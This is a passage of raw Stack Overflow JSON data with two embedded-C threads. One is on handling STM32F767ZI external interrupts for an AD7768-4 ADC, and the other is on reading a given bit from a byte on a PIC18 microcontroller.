"user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "is_accepted": false, "score": 0, "last_activity_date": 1542232929, "last_edit_date": 1542232929, "creation_date": 1542211069, "answer_id": 53304190, "question_id": 53301251, "link": "https://stackoverflow.com/questions/53301251/stm32f767zi-external-interrupt-handling/53304190#53304190", "title": "STM32F767ZI External Interrupt Handling", "body": "<p>There's a startup file generated before compile: <code>startup_stm32f767xx.s</code> - which contains all the pointers to functions. </p>\n\n<p>Under the marker <code>g_pfnVectors:</code> is  <code>.word  NMI_Handler</code> pointing to a function for handling the non-masked interrupts, and two other pointers, <code>.word     EXTI0_IRQHandler</code> and  <code>.word     EXTI1_IRQHandler</code> as vectors to the external interrupt handlers. Further down in the same file, is the following compiler directives:</p>\n\n<pre><code>.weak      NMI_Handler  \n.thumb_set NMI_Handler,Default_Handler\n\n.weak      EXTI0_IRQHandler         \n.thumb_set EXTI0_IRQHandler,Default_Handler\n\n.weak      EXTI1_IRQHandler         \n.thumb_set EXTI1_IRQHandler,Default_Handler  \n</code></pre>\n\n<p>This was the info I was looking for to be able to control my interrupts with more precision and fewer clock cycles.</p>\n"}, {"comments": [{"owner": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "edited": false, "score": 0, "creation_date": 1542304207, "post_id": 53309362, "comment_id": 93530921, "body": "@berebdi - thanks for the input. I just arrived at a similar conclusion a few moments ago (with respect to timing). I was unsure of handling the data with the Nucleo SPI channel - I&#39;m going to set that up as you suggested. That makes sense considering that the output appears to be basically a SPI interface. With respect to that - DRDY rises and falls within the n-1 clock cycle with respect to data - that shouldn&#39;t make a difference with the SPI input, right? Furthermore, can 4 SPI channels read in data at once? The ADC clocks out all 4 channels at the same time..."}, {"owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "reply_to_user": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "edited": false, "score": 0, "creation_date": 1542312315, "post_id": 53309362, "comment_id": 93534659, "body": "@JediEngineer Yes, it could be a problem. Looking at the SPI timing diagram in the STM32F767 datasheet, it needs tsu(NSS)=4*Tpclk NSS setup time, that is about 37 ns @ 108MHz APB2 clock, but on the transmitting side, the delay between DRDY falling and DCLK rising is 0 to 4.5 ns. So it will miss the first bit. But I have another idea..."}, {"owner": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "edited": false, "score": 0, "creation_date": 1542367782, "post_id": 53309362, "comment_id": 93552648, "body": "I looked into the DFSDM - it doesn&#39;t look like I can use it without the filters... from what I&#39;m seeing. But I&#39;ll keep it on hand as a second option. For the time being, I was able to get a reduction in DCLK speed to 2.5MHz, giving me about 84 clock cycles to extract my data. That should be plenty. I&#39;ll be reducing code to increase speed, and maybe we&#39;ll work with the DFSDM as well, but it&#39;s a start for now."}, {"owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "reply_to_user": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "edited": false, "score": 0, "creation_date": 1542378191, "post_id": 53309362, "comment_id": 93558287, "body": "@JediEngineer DFSDM filters can be bypassed, see the description of the <code>DFSDM_FLTxFCR</code> register, and it can be somehow synchronized to <code>EXTI14</code> or <code>EXTI15</code>, so that&#39;s where <code>DRDY</code> should go."}], "tags": [], "owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "is_accepted": false, "score": 3, "last_activity_date": 1542318049, "last_edit_date": 1542318049, "creation_date": 1542232758, "answer_id": 53309362, "question_id": 53301251, "link": "https://stackoverflow.com/questions/53301251/stm32f767zi-external-interrupt-handling/53309362#53309362", "title": "STM32F767ZI External Interrupt Handling", "body": "<blockquote>\n  <p>10 clock cycles to do what I need to... moving data should only take me 1-2 clock cycles, leaving me 8 to handle interrupts...</p>\n</blockquote>\n\n<p>No way. Interrupt entry (pushing registers, fetching the vector and filling the pipeline) takes 10-12 cycles even on a Cortex-M7. Then consider a very simple interrupt handler, just moving the input data bits to a buffer and clearing the interrupt flag:</p>\n\n<pre><code>uint32_t *p;\nvoid handler(void) {\n    *p++ = GPIOA-&gt;IDR;\n    EXTI-&gt;PR = 0x10;\n}\n</code></pre>\n\n<p>it gets translated to something like this</p>\n\n<pre><code>handler:\n    ldr     r0, .addr_of_idr // load &amp;GPIOA-&gt;IDR\n    ldr     r1, [r0]         // load GPIOA-&gt;IDR\n    ldr     r2, .addr_ofr_p  // load &amp;p\n    ldr     r3, [r2]         // load p\n    str     r1, [r3]         // store the value from IDR to *p\n    adds    r3, r3, #4       // increment p\n    str     r3, [r2]         // store p\n    ldr     r0, .addr_of_pr  // load &amp;EXTI-&gt;PR\n    movs    r1, #0x10\n    str     r1, [r0]         // store 0x10 to EXTI-&gt;PR\n    bx      lr\n.addr_of_p:\n    .word   p\n.addr_of_idr\n    .word   0x40020010\n.addr_of_pr\n    .word   0x40013C14\n</code></pre>\n\n<p>So it's 11 instructions, each taking at least one cycle, <em>after</em> interrupt entry. That's assuming the code, vector table, and the stack are all in the fastest RAM region. I'm not sure whether literal pools work in ITCM at all, using immediate literals would add 3 more cycles. Forget it.</p>\n\n<p><strong>This has to be solved with hardware.</strong></p>\n\n<p>The controller has 6 SPI interfaces, pick 4 of them. Connect <code>DRDY</code> to all four <code>NSS</code> pins, <code>DCLK</code> to all <code>SCK</code> pins, and each <code>DOUT</code> pin to one <code>MISO</code> pin. Now each SPI interface handles a single channel, and can collect up to 32 bits in its internal FIFO.</p>\n\n<p>Then I'd set an interrupt on a rising edge on one of the <code>NSS</code> pins (<code>EXTI</code> still works even if the pin is in alternate function mode), and read all data at once.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>It turns out that the STM32 SPI requres an inordinate amount of delay between <code>NSS</code> falling and <code>SCK</code> rising, which the AD7768 does not provide, so it will not work.</p>\n\n<h1>Sigma-Delta interface</h1>\n\n<p>The STM32F767 has a DFSDM peripheral, designed to receive data from external ADCs. It can receive up to 8 channels of serial data with 20 MHz, and it can even do some preprocessing that your application might need.</p>\n\n<p>The problem is that the DFSDM has no <code>DRDY</code> input, I don't exactly know how could the data transfer be synchronized. It might work by asserting the <code>START#</code> singal to reset the communication.</p>\n\n<p>If that doesn't work, then you can try starting the DFSDM channels using a timer and DMA. Connect <code>DRDY</code> to the external trigger of <code>TIM1</code> or <code>TIM8</code> (other timers won't work, because they are connected to the slower APB1 bus and the other DMA controller), start it on the rising edge of <code>ETR</code>, and let it generate a DMA request after ~20 ns. Then let the DMA write the value needed to start the channel to the DFSDM channel configuration register. Repeat for the oher three channels.</p>\n"}, {"tags": [], "owner": {"reputation": 1036, "user_id": 8848476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/irmYE.jpg?s=128&g=1", "display_name": "ReAl", "link": "https://stackoverflow.com/users/8848476/real"}, "is_accepted": false, "score": 0, "last_activity_date": 1542400034, "creation_date": 1542400034, "answer_id": 53344909, "question_id": 53301251, "link": "https://stackoverflow.com/questions/53301251/stm32f767zi-external-interrupt-handling/53344909#53344909", "title": "STM32F767ZI External Interrupt Handling", "body": "<p>I readed AD7768 DS more carefully and found that it can srnd four channels data to one DOUT pin. So, I talking again about serial audio interface (<code>SAI</code>).</p>\n\n<p>If you can lower <code>DCLK</code> frequency up to 2.5MHz than you can lower sample with ratio 1:8 (as ratio 2.5 MHz to 20 MHz) irt sample rate at full ADC clock.</p>\n\n<p>If you route all 4 channels to one output DOUT0 you slow down sample rate just in ratio 1:4.</p>\n\n<p><a href=\"https://www.analog.com/media/en/technical-documentation/data-sheets/ad7768-7768-4.pdf\" rel=\"nofollow noreferrer\">AD7768-4 DS</a></p>\n\n<p>page 53</p>\n\n<blockquote>\n  <p>On the AD7768, the interface can be configured to output conversion\n  data on one, two, or eight of the DOUTx pins. The DOUTx configuration\n  for the AD7768 is selected using the FORMATx pins (see Table 33).</p>\n</blockquote>\n\n<p>page 66 table 34: (for AD7768-4)\npage 67 figure 98:</p>\n\n<blockquote>\n  <p><code>FORMAT0 = 1</code> All channels output on the DOUT0 pin, in TDM output. Only DOUT0 is in use.</p>\n</blockquote>\n\n<p>You can use <code>SAI</code> with <code>FS</code> = <code>DRDY</code> and four slots, 32 bits/slot</p>\n"}], "owner": {"reputation": 453, "user_id": 1676310, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/297a413c1398566b772eebb399143cfd?s=128&d=identicon&r=PG", "display_name": "Jedi Engineer", "link": "https://stackoverflow.com/users/1676310/jedi-engineer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 770, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1542626864, "creation_date": 1542201751, "last_edit_date": 1542626864, "question_id": 53301251, "link": "https://stackoverflow.com/questions/53301251/stm32f767zi-external-interrupt-handling", "title": "STM32F767ZI External Interrupt Handling", "body": "<p>I'm attempting to create a proper SPI slave interface for an AD7768-4 ADC. The ADC has a SPI interface, but it doesn't output the conversions via SPI. Instead, there are data outputs that are clocked out on individual GPIO pins. So I basically need to bit-bang data, and output to SPI to get a proper slave SPI interface. Please don't ask why I'm doing it this way, it was assigned to me. </p>\n\n<p>The issue I'm having is with the interrupts. I'm using the STM32F767ZI processor - it runs at 216 MHz, and my ADC data MUST BE clocked out at 20MHz. I've set up my NMIs but what I'm not seeing is where the system calls or points to the interrupt handler.  </p>\n\n<p>I used the STMCubeMX software to assign pins and generate the setup code, and in the <code>stm32F7xx.c</code> file, it shows the <code>NMI_Handler()</code> function, but I don't see a pointer to it anywhere in the system files. I also found void <code>HAL_GPIO_EXTI_IRQHandler()</code> function in <code>STM32F7xx_hal_gpio.c</code>, which appears to check if the pin is asserted, and clears any pending bits, but it doesn't reset the interrupt flag, or check it, and again, I see no pointer to this function. </p>\n\n<p>To more thoroughly complicate things, I have 10 clock cycles to determine which flag is set (1 of two at a time), reset it, incerment a variable, and move data from the GPIO registers. I believe this is possible, but again, I'm uncertain of what the system is doing as soon as the interrupt is tripped. </p>\n\n<p>Does anyone have any experience in working with external interrupts on this processor that could shed some light on how this particular system handles things? Again - 10 clock cycles to do what I need to... moving data should only take me 1-2 clock cycles, leaving me 8 to handle interrupts... </p>\n\n<p>EDIT:</p>\n\n<p>We changed the DCLK speed to 5.12 MHz (20.48 MHz MCLK/4) because at 2.56 MHz we had exactly 12.5 microseconds to pipe data out and set up for the next DRDY pulse, and 80 kHz speed gives us exactly zero margin. At 5.12 MHz, I have 41 clock cycles to run the interrupt routine, which I can reduce slightly if I skip checking the second flag and just handle incoming data. But I feel I must use the DRDY flag check at least, and use the routine to enable the second interrupt otherwise I'll be constantly interrupting because DCLK on the ADC is always running. This allows me 6.12 microseconds to read in the data, and 6.25 microseconds to shuffle it out before the next DRDY pulse. I should be able to do that at 32 MHz SPI clock (slave) but will most likely do it at 50MHz. This is my current interrupt code:  </p>\n\n<pre><code>void NMI_Handler(void)\n{\n    if(__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_0) != RESET)         \n     {\n         count = 0;                                             \n         __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_0);                  \n         HAL_GPIO_EXTI_Callback(GPIO_PIN_0);                        \n         //     __HAL_GPIO_EXTI_CLEAR_FLAG(GPIO_PIN_0);             \n\n         HAL_NVIC_EnableIRQ(GPIO_PIN_1);                            \n     }  \n    else\n  {  \n        if(__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_1) != RESET)         \n          {\n             data_pad[count] = GPIOF-&gt;IDR;                      \n             count++;                                           \n             if (count == 31)\n              {\n                data_send = !data_send;                     \n                HAL_NVIC_DisableIRQ(GPIO_PIN_1);            \n              }\n        __  HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_1);         \n        HAL_GPIO_EXTI_Callback(GPIO_PIN_1); \n//      __HAL_GPIO_EXTI_CLEAR_FLAG(GPIO_PIN_0); \n          }\n   }\n}  \n</code></pre>\n\n<p>I am still concerned about clock cycles, and I believe I can get away with only checking the DRDY flag if I operate on the presumption that the only other EXTI flag that will trip is for the clock pin. Although I question how this will work if SYS_TICK is running in the background... I'll have to find out.    </p>\n\n<p>We're investigating a faster processor to handle the bit-banging, but right now, it looks like the PI3 won't be able to handle it if it's running Linux, and I'm unaware of too many faster processors that run either a very small reliable RTOS, or can be bare metal programmed in a pinch...</p>\n"}, {"tags": ["c", "mplab"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542201532, "post_id": 53301155, "comment_id": 93482814, "body": "To begin with, you want to create an array of <i>zero</i> elements, and store a value in it? That won&#39;t work very well."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1542201543, "post_id": 53301155, "comment_id": 93482818, "body": "<code>char Buffer[0] = 2;</code> is ill-formed. It assigns <code>2</code> to an array of length 0. (I believe, even arrays of 0 length are ill-formed.)"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1542201585, "post_id": 53301155, "comment_id": 93482850, "body": "As for your problem, you can&#39;t really &quot;read&quot; bits. You can mask out the bits you want from a byte using <a href=\"https://en.wikipedia.org/wiki/Bitwise_operation#AND\" rel=\"nofollow noreferrer\">bitwise AND</a>."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1542201611, "post_id": 53301155, "comment_id": 93482865, "body": "In general, to test for individual bits, C has bitwise operators. Example: <a href=\"https://stackoverflow.com/a/523737/7478597\">SO: C/C++ check if one bit is set in, i.e. int variable</a>."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1542201647, "post_id": 53301155, "comment_id": 93482887, "body": "The <code>unsigned</code> doesn&#39;t make it better. ;-)"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1542202637, "post_id": 53301155, "comment_id": 93483542, "body": "Please add your attempts with the suggested solutions to your question and show us what results you get."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1542202650, "post_id": 53301155, "comment_id": 93483553, "body": "@Scheff Yes, arrays of size <code>0</code> are illegal. Its one of the classic ways to cause a compile-time error intentionally."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1542202750, "post_id": 53301155, "comment_id": 93483623, "body": "And please show us an example that actually compiles."}, {"owner": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 0, "creation_date": 1542204932, "post_id": 53301155, "comment_id": 93485122, "body": "I&#39;m using xc8 compiler and pic18"}], "answers": [{"comments": [{"owner": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 0, "creation_date": 1542201864, "post_id": 53301215, "comment_id": 93483051, "body": "Thank you very much for the example i try this but it doesn&#39;t show that the number is 1.  int bit7 = ((unsigned char)Buffer[0] &gt;&gt; 7) &amp; 1;             if(bit7==1) //rest of code"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 1, "creation_date": 1542202459, "post_id": 53301215, "comment_id": 93483427, "body": "@ddd Yes it does. What exactly is the problem?"}, {"owner": {"reputation": 823, "user_id": 8219383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-skKjxh6jxds/AAAAAAAAAAI/AAAAAAAAtPU/vVIFbedVzvo/photo.jpg?sz=128", "display_name": "Michael Beer", "link": "https://stackoverflow.com/users/8219383/michael-beer"}, "reply_to_user": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 0, "creation_date": 1542203007, "post_id": 53301215, "comment_id": 93483801, "body": "@ddd Check with e.g.:  <code>#include &lt;stdio.h&gt; int main() {     &#47;&#47;           bit 7:        |          |           |           |          |     &#47;&#47;           binary:       0000 0000  1000 0000   0111 0000   1010 0000  0111 1001     unsigned char buffer [] = {0x0,       0x80,       0x70,       0xa0,      0x79};     for(size_t i = 0; sizeof(buffer) &gt; i; ++i) {         printf(&quot;%u   %i\\n&quot;, buffer[i], ((unsigned char)buffer[i] &gt;&gt; 7) &amp;1);     } }</code> . It does what you asked for, doesnt it?"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "reply_to_user": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 0, "creation_date": 1542204142, "post_id": 53301215, "comment_id": 93484569, "body": "@ddd I think you are numbering the <code>1</code> in your example <code>0b00000010</code> as bit 7, which is not a convention anyone will recognize. With this notation, one usually starts counting at 0 from right to left. And if you want to extract that bit, you do <code>((unsigned char)Buffer[0] &gt;&gt; 1) &amp; 1</code>"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 7, "last_activity_date": 1542203620, "last_edit_date": 1542203620, "creation_date": 1542201658, "answer_id": 53301215, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte/53301215#53301215", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>You must define precisely how you count the bits:</p>\n\n<ul>\n<li>starting at <code>0</code> or <code>1</code></li>\n<li>from least significant to most significant or the other way?</li>\n</ul>\n\n<p>Assuming bit <code>0</code> is the least significant, you can get bit <code>7</code> with this expression:</p>\n\n<pre><code>int bit7 = ((unsigned char)Buffer[0] &gt;&gt; 7) &amp; 1;\n</code></pre>\n\n<p>Here is a generic loop:</p>\n\n<pre><code>for (int i = 7; i &gt;= 0; i--) {\n    putchar('0' + (((unsigned char)Buffer[0] &gt;&gt; i) &amp; 1));\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "edited": false, "score": 0, "creation_date": 1542202222, "post_id": 53301356, "comment_id": 93483265, "body": "I don&#39;t know why but it doesnt returns me 1:("}, {"owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "edited": false, "score": 1, "creation_date": 1542202801, "post_id": 53301356, "comment_id": 93483663, "body": "Bit count 0 ...7"}, {"owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "edited": false, "score": 0, "creation_date": 1542202847, "post_id": 53301356, "comment_id": 93483690, "body": "But I guess that is not the problem"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 1, "creation_date": 1542202871, "post_id": 53301356, "comment_id": 93483708, "body": "I think ddd and Swordfish are both confused about the conventions for numbering bits. FYI numbering starts at zero from the <i>right</i>. The number 2 has bit 1 set, not bit 7. Bit 7 is equivalent to 128."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 1, "creation_date": 1542202872, "post_id": 53301356, "comment_id": 93483709, "body": "it seems i am counting down from 42. nevermind, i was talking bs ;)"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542203443, "post_id": 53301356, "comment_id": 93484108, "body": "@paddy No, not confused at all, just tired and heading for bed."}], "tags": [], "owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "is_accepted": false, "score": 0, "last_activity_date": 1542203480, "last_edit_date": 1542203480, "creation_date": 1542202088, "answer_id": 53301356, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte/53301356#53301356", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>Of course you had to define your bit position in advance.</p>\n\n<p>e.g.<br>\nBit7 (MSB)<br>\nBit0 (LSB)</p>\n\n<p>Test for bit 7:</p>\n\n<pre><code>if (Buffer[0] &amp; 0x80)\n{\n    //do action for bit 7 = 1\n}\nelse\n{\n    // do action for bit7 = 0\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1543227287, "post_id": 53301720, "comment_id": 93827616, "body": "You are using <code>pow(2 , N-1)</code> instead of <code>1&lt;&lt;N</code> ?"}, {"owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1543227762, "post_id": 53301720, "comment_id": 93827913, "body": "Yes, I don&#39;t shift something.I just initialize a char.I could also have 0x01 and shift it for N bytes, you are right just different approach."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1543227855, "post_id": 53301720, "comment_id": 93827977, "body": "Are you aware that a shift will be much much quicker? Less code, less time."}, {"owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1543229176, "post_id": 53301720, "comment_id": 93828646, "body": "Yes indeed , I fixed it.Good catch!"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1543229656, "post_id": 53301720, "comment_id": 93828910, "body": "You are off by 1 bit"}, {"owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1543229899, "post_id": 53301720, "comment_id": 93829027, "body": "I use N-1 because I assume that LSBit is bit number 1."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "edited": 